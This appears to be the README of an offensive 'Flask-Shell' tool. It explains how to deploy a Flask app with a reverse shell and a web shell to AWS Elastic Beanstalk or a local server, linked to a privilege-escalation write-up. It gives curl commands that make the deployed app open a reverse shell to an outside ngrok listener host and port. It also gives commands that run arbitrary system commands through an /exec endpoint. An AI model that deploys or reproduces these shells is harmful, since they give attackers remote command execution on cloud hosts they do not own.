# Flask-Shell
This Contains Flask Web and Reverse Shell

## Execute Reverse Shell
### From Elastic Beanstalk

Modify the Host and Port from the reverse shell application.py to get shell in your listener. If publishing to Elastic BeanStalk you will automatically get a Shell, if configured the Host and Port of you listener properly. 

Else The Reverse Shell can be executed, by sending the following GET request with your desired listener Host and Port

```bash
curl "http://<your-elastic-beanstalk-URL>/reverse_shell?host=0.tcp.ap.ngrok.io&port=18996"
```

More Info:

https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-elastic-beanstalk-privesc.html#elasticbeanstalkrebuildenvironment-s3-write-permissions--many-others

https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/python-quickstart.html

### From Local Setup for Testing

Make changes to the Last Line as below to run on local server port 5000

```python
# Use the following if you're upload to Elastic BeanStalk or other such container
    # application.run(debug=True)
    # Use the following for local Testing
     application.run(host='0.0.0.0', port=5000)
```

Then run the following command from the same folder where the application.py and requirments.txt file exist to start the Flask server with the reverse shell.

```
# export FLASK_APP=application.py && flask run --port 5000
 * Serving Flask app 'application.py'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
```

And start your listener and execute the following URL, depending your listener host and port.

```bash
curl "http://127.0.0.1:5000/reverse_shell?host=127.0.0.1&port=4444"
```


## Execute Web Shell
### From Elastic Beanstalk

Upload and Publish the Web Shell Flask app, as your requirments needed. Find help from the following links.

More Info:

https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-elastic-beanstalk-privesc.html#elasticbeanstalkrebuildenvironment-s3-write-permissions--many-others

https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/python-quickstart.html

Execute command by Sending the Following GET Request

```bash
curl "http://<your-elastic-beanstalk-URL>/exec?command=ls%20-l"
```

### From Local Setup for Testing

Make changes to the Last Line as below to run on local server port 5000

```python
# Use the following if you're upload to Elastic BeanStalk or other such container
    # app.run(debug=True)
    # Use the following for local Testing
     app.run(host='0.0.0.0', port=5000)
```

Then run the following command from the same folder where the application.py and requirments.txt file exist to start the Flask server with the reverse shell.

```
# export FLASK_APP=application.py && flask run --port 5000
 * Serving Flask app 'application.py'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
```

And start your listener and execute the following URL, depending your listener host and port.

```bash
curl "http://127.0.0.1:5000/exec?command=ls%20-l"
```
